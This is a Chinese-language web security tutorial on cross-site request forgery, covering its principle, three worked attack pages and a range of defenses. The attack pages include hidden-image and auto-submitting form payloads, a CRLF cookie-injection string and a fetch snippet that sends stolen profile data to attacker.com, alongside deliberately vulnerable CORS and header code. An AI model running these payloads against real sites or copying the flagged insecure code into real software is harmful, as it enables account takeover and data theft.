CSRF 跨站请求伪造：原理、攻击与防御

安全 Web安全 CSRF
发布日期:   2026-08-07

一、核心原理

CSRF（Cross-Site Request Forgery，跨站请求伪造）的本质是浏览器在跨站请求时自动携带了目标站点的身份凭证（Cookie），服务端无法区分这个请求是用户主动发起的，还是被第三方页面诱导发出的。

理解 CSRF 需要抓住一个前提：浏览器的同源策略（Same-Origin Policy）只限制了 JavaScript 读取跨域响应内容，但不阻止浏览器向其他域发送请求。也就是说，你的浏览器可以替别人发请求，只是你读不到响应而已。对于 CSRF 攻击来说，它根本不需要读响应——它只需要让请求发出去就够了。

一个完整的 CSRF 攻击需要满足三个条件：

第一，用户在目标站点有已认证的会话（浏览器中存有目标站的 Cookie）。第二，目标站点的关键操作仅靠 Cookie 做身份认证，没有额外的校验机制（如 CSRF Token、SameSite Cookie）。第三，攻击者能诱导用户访问一个包含伪造请求的页面（通过链接、邮件、嵌入图片等方式）。

三个条件同时满足时，攻击者就能以用户的身份执行非预期操作——转账、改密码、删数据、加管理员。

二、三种 CSRF 完整攻击实例

2.1 GET 型 CSRF：图片标签触发转账

场景： 一个网银系统，转账接口是 GET 请求：https://bank.com/transfer?to=attacker&amount=10000。用户登录后，浏览器持有 bank.com 的会话 Cookie。

第一步：确认攻击面。 攻击者注册网银账号，抓包分析转账流程。发现转账操作是一个 GET 请求，参数直接放在 URL 中，服务端只靠 Cookie 验证身份，没有其他校验。

第二步：构造攻击页面。 攻击者搭建一个页面 https://attacker.com/prize.html，内容如下：

<!DOCTYPE html>
<html>
<head><title>恭喜中奖！</title></head>
<body>
  <h1>恭喜！您获得了 iPhone 16！</h1>
  <p>点击下方链接领取奖品...</p>
  <!-- 隐藏的图片标签，src 指向转账接口 -->
  <img src="https://bank.com/transfer?to=attacker_account&amount=10000" width="0" height="0">
</body>
</html>

第三步：诱导用户访问。 攻击者通过邮件、论坛私信、群聊发送这个链接。用户点击后打开 attacker.com/prize.html。

第四步：浏览器自动执行。 浏览器渲染页面时遇到 <img src="https://bank.com/transfer?to=attacker_account&amount=10000">，自动向 bank.com 发起 GET 请求。由于用户已登录 bank.com，浏览器自动携带 bank.com 的 Cookie。bank.com 服务端收到请求，看到有效的会话 Cookie，执行转账操作。

完整数据流：

用户点击恶意链接
  → 浏览器加载 attacker.com/prize.html
  → 页面中包含 <img src="https://bank.com/transfer?to=attacker&amount=10000">
  → 浏览器向 bank.com 发起 GET 请求，自动携带 bank.com 的 Cookie
  → bank.com 服务端收到请求，Cookie 有效，执行转账
  → 攻击者账户收到 10000 元
  → 用户毫无感知（图片加载失败也不会显示任何提示）

为什么这能成功？ 因为 <img>、<link>、<script> 等标签发起的请求不受同源策略限制——浏览器会正常加载这些资源，并自动携带目标域的 Cookie。服务端看到合法 Cookie，认为这是用户本人的操作。

GET 型 CSRF 的特点： 最简单，一个标签就能触发。但只能发 GET 请求，适用于那些把操作参数放在 URL 中的系统（这类系统本身就有设计问题——状态变更操作不应该用 GET）。

2.2 POST 型 CSRF：自动提交表单

场景： 一个邮箱系统，修改密码的接口是 POST 请求：https://mail.com/api/change-password，请求体为 {"newPassword": "xxx"}。服务端靠 Cookie 验证身份。

第一步：确认攻击面。 攻击者分析修改密码的接口，确认是 POST 请求，参数在请求体中，服务端只靠 Cookie 认证。

第二步：构造攻击页面。 攻击者搭建 https://attacker.com/verify.html：

<!DOCTYPE html>
<html>
<head><title>账号安全验证</title></head>
<body>
  <h1>您的账号存在异常，请立即验证</h1>
  <p>点击下方按钮完成安全验证...</p>

  <!-- 隐藏的自动提交表单 -->
  <form id="csrf-form" action="https://mail.com/api/change-password" method="POST" style="display:none">
    <input type="hidden" name="newPassword" value="hacked123">
  </form>

  <button onclick="document.getElementById('csrf-form').submit()">立即验证</button>

  <!-- 或者自动提交，不需要用户点击 -->
  <script>
    // 页面加载后自动提交
    window.onload = function() {
      document.getElementById('csrf-form').submit();
    };
  </script>
</body>
</html>

第三步：诱导用户访问。 攻击者发送伪装邮件：”您的邮箱存在异常登录，请立即验证账号安全”，附带链接指向 attacker.com/verify.html。

第四步：自动执行。 用户点击链接后，页面加载完成，window.onload 触发，隐藏表单自动提交到 mail.com/api/change-password。浏览器携带 mail.com 的 Cookie，服务端验证通过，密码被改为 hacked123。

完整数据流：

用户点击钓鱼邮件链接
  → 浏览器加载 attacker.com/verify.html
  → 页面 JS 执行，自动提交隐藏表单到 mail.com
  → 浏览器向 mail.com 发起 POST 请求，Content-Type: application/x-www-form-urlencoded
  → 请求自动携带 mail.com 的 Cookie
  → mail.com 服务端收到请求，Cookie 有效，执行密码修改
  → 用户密码被改为 hacked123
  → 攻击者用新密码登录用户邮箱

与 GET 型的关键区别： POST 型能发送请求体，适用于绝大多数 Web 操作（转账、修改信息、删除数据等）。HTML 表单天然支持 POST，所以攻击者不需要任何特殊技术，一个 <form> 标签就够了。

两种诱导方式的区别： 一种是页面加载后自动提交（window.onload），用户甚至不需要点击任何东西；另一种是诱导用户点击按钮（伪装成”验证”、”领取”等操作），适用于需要用户交互才能触发的场景。

2.3 AJAX 型 CSRF：JSON 请求伪造

场景： 一个管理后台，添加管理员的接口只接受 JSON 格式的请求：POST https://admin.com/api/users，Content-Type: application/json，请求体 {"role": "admin", "email": "attacker@evil.com"}。

问题： 传统 HTML 表单只能发送 application/x-www-form-urlencoded、multipart/form-data、text/plain 三种 Content-Type。如果服务端只接受 application/json，普通表单无法直接伪造。

攻击方式一：利用 text/plain 绕过。 HTML 表单可以发送 Content-Type: text/plain 的请求。如果服务端在解析 JSON 时不够严格（比如某些框架会自动将 text/plain 的请求体当 JSON 解析），攻击者可以：

<form action="https://admin.com/api/users" method="POST" enctype="text/plain">
  <input name='{"role":"admin","email":"attacker@evil.com","ignore":"' value='"}'>
</form>

表单发送的请求体为：{"role":"admin","email":"attacker@evil.com","ignore":"="}。如果服务端的 JSON 解析器足够宽容（忽略多余字段），这个请求就能成功。

攻击方式二：利用 Flash/Java 插件（已淘汰）。 过去可以通过 Flash 的 navigateToURL 或 Java Applet 发送自定义 Content-Type 的请求。现代浏览器已禁用这些插件，这条路基本不通。

攻击方式三：利用 CORS 配置错误。 如果 admin.com 的 CORS 配置为 Access-Control-Allow-Origin: * 且 Access-Control-Allow-Credentials: true（这个组合浏览器实际上会拒绝携带 Cookie，但如果服务端错误地反射了 Origin），攻击者可以直接用 fetch 发 JSON 请求：

<script>
fetch('https://admin.com/api/users', {
  method: 'POST',
  credentials: 'include',  // 携带 Cookie
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ role: 'admin', email: 'attacker@evil.com' })
});
</script>

如果 admin.com 的 CORS 配置正确（不允许跨域携带凭证），这个请求会被浏览器拦截。但如果 CORS 配置有漏洞（如动态反射 Origin），请求就能成功。

完整数据流（CORS 配置错误场景）：

用户访问攻击页面
  → 页面 JS 执行 fetch 请求到 admin.com
  → credentials: 'include' 让浏览器携带 admin.com 的 Cookie
  → admin.com 的 CORS 配置错误，允许了跨域请求
  → 服务端收到 JSON 请求，Cookie 有效，创建管理员账户
  → 攻击者用新管理员账户登录后台

AJAX 型 CSRF 的现实意义： 随着 API 的普及，越来越多接口只接受 JSON 格式。这在一定程度上提高了 CSRF 的攻击门槛（普通表单无法直接伪造），但如果 CORS 配置有漏洞，或者服务端对 Content-Type 的处理不够严格，攻击仍然可行。

三、防御策略详解

3.1 SameSite Cookie：从协议层面阻断

SameSite 是 Cookie 的一个属性，告诉浏览器在跨站请求时是否携带该 Cookie。这是目前防御 CSRF 最直接、最有效的手段。

Set-Cookie: session_id=abc123; SameSite=Strict

三个取值的行为差异：

Strict：最严格。任何跨站请求都不携带 Cookie。即使用户从 bank.com 的链接点进来，bank.com 的 Cookie 也不会被发送。这意味着用户每次从外部链接进入都需要重新登录，用户体验较差。

Lax：较宽松。允许顶级导航（用户主动点击链接跳转、地址栏直接输入 URL）携带 Cookie，但阻止 AJAX、<img>、<form> 等跨站请求携带。这是大多数场景的最佳选择——正常的链接跳转不受影响，但 CSRF 攻击常用的表单提交和图片标签无法携带 Cookie。

None：不限制。跨站请求也携带 Cookie，但必须同时设置 Secure 标志（仅 HTTPS 传输）。这是完全不做 CSRF 防护的状态。

SameSite=Lax 为什么能挡住大部分 CSRF？ 因为 CSRF 攻击的核心是让浏览器在用户不知情的情况下发送跨站请求。<form> 自动提交、<img> 标签加载、fetch 跨域请求——这些都不是顶级导航，SameSite=Lax 下浏览器不会携带 Cookie。没有 Cookie，服务端就无法认证用户身份，CSRF 攻击自然失败。

局限性： SameSite 不是万能的。老版本浏览器（Chrome 80 以下、Safari 12 以下）不支持 SameSite，会回退到默认行为。更本质的局限在于：SameSite 只拦截跨站请求，如果攻击者能在同站（same-site）上下文中触发请求，SameSite 完全不起作用。

同站上下文绕过 SameSite 的原理： 浏览器判断”同站”的标准是注册域（registrable domain），不是完整域名。mail.bank.com 和 api.bank.com 虽然子域不同，但注册域都是 bank.com，浏览器认为它们是同站。SameSite 对同站请求一律放行。

攻击者有两种方式制造同站上下文。第一种，目标站自身存在 XSS。假设 bank.com/search 有存储型 XSS，攻击者注入了一段 JS。这段 JS 在 bank.com 的上下文中执行，它发起的 fetch('/api/transfer', ...) 对浏览器来说是同站请求（从 bank.com 到 bank.com）。SameSite Cookie 正常携带，CSRF Token 如果也被 XSS 读到了就能一起带上。第二种，子域被攻陷（子域接管）。假设 bank.com 有个子域 old.bank.com 指向一个过期的第三方服务，攻击者注册了那个服务，拿到了 old.bank.com 的控制权。浏览器认为 old.bank.com 和 bank.com 是同站（注册域都是 bank.com），攻击者在 old.bank.com 上放的表单提交到 bank.com/api/transfer，SameSite Cookie 正常携带。

正常 CSRF 攻击（被 SameSite 拦截）：
  用户在 attacker.com 的页面上
  → 表单提交到 bank.com/api/transfer
  → 浏览器判断：attacker.com vs bank.com → 跨站
  → SameSite=Lax 阻止携带 Cookie → 攻击失败

XSS + CSRF 组合（SameSite 无法拦截）：
  用户在 bank.com 的页面上（XSS 已注入）
  → 恶意 JS 发起 fetch 到 bank.com/api/transfer
  → 浏览器判断：bank.com vs bank.com → 同站
  → SameSite 放行，Cookie 携带 → 攻击成功

所以 SameSite 防的是”从外部站点发起的跨站伪造请求”。如果攻击者已经能在目标站内部执行代码（XSS）或者在目标站的同站子域上放置内容（子域接管），SameSite 就没有用武之地。这也是为什么 CSRF 防御不能只靠 SameSite，需要纵深防御——XSS 防住了，SameSite 才不会被绕过。

浏览器默认行为变化： Chrome 80+ 开始，未显式设置 SameSite 的 Cookie 默认视为 Lax。这是一个重要的安全改进——即使开发者忘了设置 SameSite，浏览器也会提供基本的 CSRF 防护。但不能依赖这个默认行为，应该显式设置。

3.2 CSRF Token：服务端校验的金标准

CSRF Token 的原理是：服务端为每个会话（或每个请求）生成一个随机、不可预测的令牌，嵌入到表单或页面中。提交请求时必须携带这个令牌，服务端校验令牌的有效性。攻击者无法获取这个令牌（受同源策略限制，跨域读不到页面内容），所以无法伪造有效请求。

同步令牌模式（Synchronizer Token Pattern）：

服务端在渲染页面时，将 Token 嵌入到表单的隐藏字段中：

<form action="/api/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="rAnd0mT0k3nV4lu3">
  <input type="text" name="to" placeholder="收款账户">
  <input type="number" name="amount" placeholder="金额">
  <button type="submit">转账</button>
</form>

服务端校验逻辑：

# Python Flask 示例
@app.route('/api/transfer', methods=['POST'])
def transfer():
    token = request.form.get('csrf_token')
    if not token or token != session.get('csrf_token'):
        abort(403, 'CSRF token validation failed')
    # 正常处理转账逻辑

攻击者在 attacker.com 构造的表单中没有有效的 csrf_token（因为同源策略阻止了攻击者读取 bank.com 页面中的 Token），请求被服务端拒绝。

Token 的安全要求：

随机性——Token 必须是密码学安全的随机数（如 secrets.token_hex(32)），攻击者无法猜测或枚举。

唯一性——每个会话（或每个请求）使用不同的 Token，防止重放攻击。

不可预测性——即使攻击者知道自己的一个 Token，也无法推断出其他用户的 Token。

双重提交 Cookie 模式（Double Submit Cookie）：

适用于前后端分离的 SPA 架构（服务端不渲染 HTML，无法在表单中嵌入 Token）。

流程：服务端在用户登录时设置一个 Cookie csrf_token=xxx，前端 JS 读取这个 Cookie 的值，在每次请求中将它放到自定义请求头中：

// 前端：读取 Cookie 中的 Token，放到请求头
const token = document.cookie.match(/csrf_token=([^;]+)/)[1];
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': token,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ to: 'attacker', amount: 10000 })
});

# 服务端：校验请求头中的 Token 与 Cookie 中的 Token 是否一致
@app.route('/api/transfer', methods=['POST'])
def transfer():
    header_token = request.headers.get('X-CSRF-Token')
    cookie_token = request.cookies.get('csrf_token')
    if not header_token or header_token != cookie_token:
        abort(403, 'CSRF token mismatch')

为什么这能防 CSRF？ 因为跨站请求无法读取目标站的 Cookie（同源策略限制），攻击者不知道 csrf_token 的值，也就无法在 X-CSRF-Token 请求头中填入正确的值。服务端发现请求头中没有 Token 或 Token 不匹配，拒绝请求。

注意： 双重提交模式的安全性依赖于攻击者无法设置目标站的 Cookie。如果存在 Cookie 注入漏洞（如 CRLF 注入），攻击者可能伪造 Token。

CRLF 注入如何打破双重提交模式： CRLF 注入是指攻击者能在服务端的 HTTP 响应中注入换行符（\r\n），从而插入任意响应头。假设 bank.com 有个接口存在 CRLF 注入漏洞：

# 危险：用户输入未经过滤直接放入响应头
response.headers['Location'] = request.args.get('url')

攻击者构造输入 url=x\r\nSet-Cookie: csrf_token=known123\r\nAccess-Control-Allow-Origin: https://attacker.com\r\nAccess-Control-Allow-Credentials: true，服务端返回的响应变成：

HTTP/1.1 302 Found
Location: x
Set-Cookie: csrf_token=known123; Path=/
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true

浏览器收到后，将 bank.com 的 csrf_token Cookie 覆盖为 known123（攻击者已知的值），同时允许 attacker.com 跨域读取响应并携带凭证。攻击者现在既知道 Token 的值，又能跨域读取 bank.com 的响应，双重提交模式完全失效。

为什么同步令牌模式不受影响？ 同步令牌模式的校验逻辑不同：

双重提交模式：
  校验 = Cookie 中的 Token == 请求头中的 Token
  两者都在客户端，攻击者能同时控制两者 → 不安全

同步令牌模式：
  校验 = 请求中的 Token == 服务端 Session 中存储的 Token
  一个在客户端，一个在服务端，攻击者只能控制客户端那个 → 安全

攻击者通过 CRLF 注入能控制 Cookie，但控制不了服务端的 Session。即使 Cookie 中的 csrf_token 被设为 known123，服务端 Session 中存的仍然是原始生成的随机值，两者不匹配，校验失败。

结论： 双重提交模式的安全性建立在”攻击者无法读写目标站 Cookie”这个假设上。CRLF 注入打破了这个假设。同步令牌模式不依赖这个假设——即使攻击者完全控制了客户端的所有数据，他仍然拿不到服务端 Session 中存储的 Token。这就是”服务端存储更安全”的含义。

3.3 自定义请求头：利用浏览器的跨域限制

对于前后端分离的 API，要求所有状态变更请求必须携带自定义请求头（如 X-CSRF-Token、X-Requested-With）：

// 前端：所有 API 请求都带上自定义头
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ to: 'attacker', amount: 10000 })
});

# 服务端：校验自定义头
@app.before_request
def verify_csrf():
    if request.method in ('POST', 'PUT', 'DELETE'):
        if not request.headers.get('X-Requested-With'):
            abort(403, 'Missing required header')

为什么这能防 CSRF？ HTML 表单只能发送 application/x-www-form-urlencoded、multipart/form-data、text/plain 三种 Content-Type，无法设置自定义请求头。<img>、<link> 等标签发起的请求也无法携带自定义头。所以，如果服务端要求必须有自定义头才能处理请求，传统的 CSRF 攻击手段（表单提交、图片标签）全部失效。

与 JSON Content-Type 配合： 如果服务端只接受 application/json 的 Content-Type，并且要求自定义请求头，攻击者需要同时绕过两个限制。HTML 表单无法发送 application/json，也无法设置自定义头，攻击面被大幅收窄。

局限性： 这个防御依赖于 CORS 配置正确。自定义头只挡住了不会写 JS 的低级 CSRF 攻击（传统表单、图片标签）。会写 JS 的攻击者用 fetch 就能绕过自定义头，此时唯一能挡住他的是 CORS 策略。

fetch 如何绕过自定义头防御： fetch API 能在请求中设置任意自定义头：

// attacker.com 上的恶意代码
fetch('https://bank.com/api/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'X-Requested-With': 'XMLHttpRequest',  // 想设就设
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ to: 'attacker', amount: 10000 })
});

当 fetch 设置了自定义头（非简单头），浏览器会先发一个 OPTIONS 预检请求问服务端：”你允许 attacker.com 带 X-Requested-With 头发请求吗？”

→ OPTIONS /api/transfer HTTP/1.1
→ Host: bank.com
→ Origin: https://attacker.com
→ Access-Control-Request-Method: POST
→ Access-Control-Request-Headers: X-Requested-With, Content-Type

← HTTP/1.1 204 No Content
← Access-Control-Allow-Origin: https://attacker.com     ← 关键
← Access-Control-Allow-Headers: X-Requested-With         ← 关键
← Access-Control-Allow-Credentials: true                  ← 关键

如果服务端返回的 CORS 头中包含了 Access-Control-Allow-Headers: X-Requested-With，浏览器认为”bank.com 允许跨域请求带这个头”，于是放行真正的 POST 请求。攻击成功。如果服务端没有返回这个头（或者 Allow-Origin 没包含 attacker.com），浏览器直接拦截响应，攻击失败。

两层防御的叠加关系：

第一层：自定义头校验
  服务端要求请求必须有 X-Requested-With 头
  → 挡住 <form>、<img>、<link> 等传统 CSRF 手段

第二层：CORS 策略
  浏览器对 fetch 的自定义头请求发 OPTIONS 预检
  → 服务端必须在 CORS 响应中明确允许该头
  → 如果 CORS 配置正确（不允许 attacker.com），fetch 也被挡住
  → 如果 CORS 配置错误（允许了 attacker.com 或 *），fetch 绕过第一层

自定义头防御只挡住了传统 CSRF 手段。一旦攻击者用上 fetch，自定义头防御就失效了，此时只能靠 CORS 兜底。两层叠在一起才完整。

3.4 Referer / Origin 校验：简单但有效的辅助手段

每个 HTTP 请求都带有 Origin 头（POST 请求）或 Referer 头，表明请求来源。服务端可以校验这些头是否来自本站：

@app.before_request
def verify_origin():
    if request.method in ('POST', 'PUT', 'DELETE'):
        origin = request.headers.get('Origin', request.headers.get('Referer', ''))
        if not origin.startswith('https://mysite.com'):
            abort(403, 'Invalid origin')

Origin vs Referer 的区别：

Origin 只在跨域 POST 请求中发送，格式为 scheme://host:port（不含路径），隐私友好。现代浏览器在 CORS 请求中自动添加。

Referer 在所有请求中发送，包含完整 URL（含路径和查询参数）。可能包含敏感信息（如 /user/profile?token=xxx），且用户可以配置浏览器不发送 Referer。

推荐校验 Origin，因为它是浏览器自动添加的，攻击者无法在跨站请求中伪造（浏览器会根据请求的实际来源设置 Origin）。

局限性： 部分浏览器或隐私插件会剥离 Referer/Origin 头。如果直接拒绝缺少这些头的请求，可能误杀正常用户。所以 Origin/Referer 校验通常作为辅助手段，不单独使用。

3.5 正确的 CORS 配置

CORS（Cross-Origin Resource Sharing）配置错误是 CSRF 的帮凶。正确的 CORS 配置是 CSRF 防御的重要一环。

错误配置示例：

Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

这个组合在规范中是被禁止的——当 Allow-Credentials: true 时，Allow-Origin 不能为 *。但某些服务端框架可能不检查这个约束，导致浏览器在某些情况下仍然允许跨域携带 Cookie。

更危险的错误配置——动态反射 Origin：

有些开发者不想维护白名单，或者觉得白名单不够灵活（比如有多个前端域名：测试环境、预发布、生产环境），于是写了一个”省事”的逻辑——请求带什么 Origin，响应就原样返回什么 Origin：

# 危险：将请求的 Origin 原样返回
@app.after_request
def add_cors(response):
    origin = request.headers.get('Origin', '')
    if origin:  # 只要有 Origin 头就反射回去
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response

这段代码的效果是：服务端对所有人都说”我允许你”。它没有 * 通配符的形式，但效果等同于 *。

attacker.com 发请求：
  Origin: https://attacker.com
  → 服务端返回 Access-Control-Allow-Origin: https://attacker.com
  → 浏览器一看，允许！放行！

evil.com 发请求：
  Origin: https://evil.com
  → 服务端返回 Access-Control-Allow-Origin: https://evil.com
  → 浏览器一看，允许！放行！

为什么开发者会写这种代码？ 常见原因有三种。第一种，前后端分离项目有多个前端域名，不想逐个写死。第二种，开发者误以为 Origin 头是浏览器自动加的、用户不可控的，所以”反射 Origin”等于”只允许浏览器来的请求”。但 Origin 虽然由浏览器自动添加，攻击者完全可以选择从哪个域发起请求——他只需要在自己的域上放一段 JS 就行。第三种，开发者知道 Allow-Origin: * 不能和 Allow-Credentials: true 一起用（规范禁止），于是用”反射 Origin”来绕过这个限制。

攻击者怎么利用：

// 攻击者在 attacker.com 上放这段 JS
fetch('https://bank.com/api/user/profile', {
  credentials: 'include'  // 携带 bank.com 的 Cookie
})
.then(r => r.json())
.then(data => {
  // 拿到了用户的个人信息、邮箱、手机号等
  new Image().src = 'https://attacker.com/log?data=' + JSON.stringify(data);
});

1. 攻击者的 JS 发起 fetch 到 bank.com
2. 浏览器自动添加 Origin: https://attacker.com
3. 浏览器发 OPTIONS 预检请求
4. 服务端取出 Origin，原样返回
   → Access-Control-Allow-Origin: https://attacker.com
   → Access-Control-Allow-Credentials: true
5. 浏览器检查：Allow-Origin 包含 attacker.com？是的。放行。
6. 浏览器发送真正的 GET 请求，携带 bank.com 的 Cookie
7. 服务端返回用户数据
8. 攻击者的 JS 读取响应内容，数据泄露

对比白名单做法：

# 安全：白名单控制
ALLOWED_ORIGINS = {'https://mysite.com', 'https://admin.mysite.com'}

@app.after_request
def add_cors(response):
    origin = request.headers.get('Origin', '')
    if origin in ALLOWED_ORIGINS:
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'
    # 不在白名单中 → 不返回 CORS 头 → 浏览器拦截响应
    return response

同样的攻击请求，Origin: https://attacker.com 不在白名单中，服务端不返回 Access-Control-Allow-Origin 头，浏览器拦截响应，攻击者的 JS 读不到任何数据。

动态反射 Origin 等于对所有域开放 CORS，攻击者可以在自己的页面上用 fetch 携带用户的 Cookie 发请求，CSRF Token 和 SameSite Cookie 的防护都可能被绕过。

正确配置：

# 安全：白名单控制允许的 Origin
ALLOWED_ORIGINS = {'https://mysite.com', 'https://admin.mysite.com'}

@app.after_request
def add_cors(response):
    origin = request.headers.get('Origin', '')
    if origin in ALLOWED_ORIGINS:
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response

只允许已知可信的域发起跨域请求。不在白名单中的域（包括攻击者的域）无法通过 CORS 校验，浏览器会拦截响应。

3.6 关键操作增加二次验证

对于高风险操作（转账、修改密码、绑定邮箱、删除账户），仅靠 Cookie 认证是不够的。应该增加额外的验证步骤：

重新输入密码： 修改密码、绑定邮箱等操作要求用户重新输入当前密码。攻击者无法知道用户密码，CSRF 攻击失败。

<form action="/api/change-password" method="POST">
  <input type="hidden" name="csrf_token" value="xxx">
  <input type="password" name="currentPassword" placeholder="请输入当前密码">
  <input type="password" name="newPassword" placeholder="新密码">
  <button type="submit">确认修改</button>
</form>

短信/邮箱验证码： 转账、修改绑定手机等操作发送验证码到用户手机或邮箱。攻击者无法获取验证码。

TOTP（Google Authenticator）： 高安全级别的操作要求输入 TOTP 动态口令。

生物识别 / WebAuthn： 最高安全级别，要求指纹或硬件密钥确认。

二次验证的定位： 它不是 CSRF 的专项防御，而是纵深防御的最后一层。即使 CSRF Token、SameSite Cookie、CORS 全部被绕过，攻击者仍然无法通过二次验证。但二次验证有用户体验成本，不适合每个操作都用，应该只用于高风险操作。

四、CSRF 与其他攻击的对比

理解 CSRF 的最佳方式是和 XSS、JSONP 劫持做对比：

XSS vs CSRF： XSS 是攻击者在目标站的页面中注入代码，利用的是目标站对输出内容的编码不当。CSRF 是攻击者诱导用户访问攻击者控制的页面，利用的是浏览器自动携带 Cookie 的行为。XSS 攻击者需要攻破目标站，CSRF 攻击者不需要。

CSRF vs JSONP 劫持： JSONP 通过 <script> 标签跨域获取数据，如果 JSONP 接口携带了用户 Cookie 且没有校验，攻击者可以在自己的页面中用 <script> 标签调用 JSONP 接口窃取数据。CSRF 是”以用户身份执行操作”，JSONP 劫持是”窃取用户数据”。JSONP 已基本被淘汰（被 CORS 取代），但在老系统中仍可能遇到。

五、各语言/框架的 CSRF 防护

5.1 Java / Spring

Spring Security 默认开启 CSRF 防护，使用 CsrfFilter 自动校验 Token：

// Spring Security 默认配置已包含 CSRF 防护
@Configuration
@EnableWebSecurity
public class SecurityConfig extends WebSecurityConfigurerAdapter {
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            // CSRF 防护默认开启，无需显式配置
            .csrf().csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            // 对于前后端分离项目，使用 Cookie 模式存储 Token
            ...;
    }
}

对于前后端分离项目，使用 CookieCsrfTokenRepository，前端从 Cookie 中读取 Token 放到请求头中。注意：如果显式调用了 .csrf().disable()，CSRF 防护被关闭，需要确认是否有其他替代措施。

5.2 Python / Django

Django 内置 CSRF 中间件和模板标签，默认开启：

# settings.py 中确认中间件存在
MIDDLEWARE = [
    ...
    'django.middleware.csrf.CsrfViewMiddleware',
    ...
]

<!-- 模板中自动嵌入 Token -->
<form method="post">
  {% csrf_token %}
  <input type="text" name="username">
  <button type="submit">提交</button>
</form>

对于 AJAX 请求，Django 在 Cookie 中设置 csrftoken，前端读取后放到请求头：

// 前端：从 Cookie 读取 csrftoken
function getCookie(name) {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) return parts.pop().split(';').shift();
}

fetch('/api/action', {
  method: 'POST',
  headers: {
    'X-CSRFToken': getCookie('csrftoken'),
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ action: 'transfer' })
});

常见错误： 使用 @csrf_exempt 装饰器跳过了 CSRF 校验。如果该视图处理状态变更操作，等于主动放弃防护。

5.3 Python / Flask

Flask 本身不内置 CSRF 防护，需要扩展：

# 使用 Flask-WTF（推荐）
from flask_wtf.csrf import CSRFProtect

app.secret_key = 'secure-random-key'
csrf = CSRFProtect(app)

# 所有 POST 请求自动校验 CSRF Token
# 模板中使用 {{ form.hidden_tag() }} 或 {{ csrf_token() }}

5.4 Node.js / Express

// 使用 csurf 中间件（注意：csurf 已不再维护，推荐 alternatives）
// 替代方案：自行实现 Token 校验
const crypto = require('crypto');

function generateToken() {
  return crypto.randomBytes(32).toString('hex');
}

// 中间件：校验 Token
function csrfProtection(req, res, next) {
  if (['POST', 'PUT', 'DELETE'].includes(req.method)) {
    const token = req.headers['x-csrf-token'] || req.body._csrf;
    if (!token || token !== req.session.csrfToken) {
      return res.status(403).json({ error: 'CSRF token invalid' });
    }
  }
  // 为每个请求生成新 Token
  req.session.csrfToken = generateToken();
  res.cookie('XSRF-TOKEN', req.session.csrfToken, { sameSite: 'lax' });
  next();
}

六、防御优先级总结

按重要程度排列：

  1. SameSite Cookie——设置 SameSite=Lax 或 Strict，从协议层面阻断跨站请求携带 Cookie，是最直接的防御
  2. CSRF Token——同步令牌模式或双重提交 Cookie 模式，服务端校验请求的合法性，是金标准
  3. 正确的 CORS 配置——白名单控制允许的 Origin，不动态反射 Origin，不设置 Allow-Origin: * + Allow-Credentials: true
  4. 自定义请求头——要求状态变更请求携带 X-CSRF-Token 或 X-Requested-With，利用浏览器跨域限制
  5. Origin/Referer 校验——作为辅助手段，校验请求来源是否合法
  6. 高风险操作二次验证——转账、改密码等操作要求重新输入密码或验证码
  7. 避免 GET 请求执行状态变更——状态变更操作只用 POST/PUT/DELETE，减少攻击面

七、小结

CSRF 的本质是浏览器在跨站请求时自动携带目标站 Cookie，服务端无法区分请求来源是用户主动还是被诱导。攻击者不需要窃取用户的 Cookie，只需要诱导用户访问一个包含伪造请求的页面，浏览器就会替用户发出携带有效凭证的请求。

按请求构造方式分三种：GET 型用 <img> 或 <link> 标签触发，最简单但只能发 GET 请求；POST 型用隐藏表单自动提交，适用于绝大多数操作；AJAX 型利用 CORS 配置错误发送 JSON 请求，攻击门槛最高但威力也最大。

防御的核心是纵深防御。SameSite Cookie 从协议层面阻断跨站携带凭证，是第一道防线。CSRF Token 让服务端能校验请求是否来自合法页面，是金标准。正确的 CORS 配置防止攻击者利用跨域能力绕过前两层。高风险操作增加二次验证，作为最后一道兜底。任何一层缺失都可能被突破，组合使用才能有效防御。
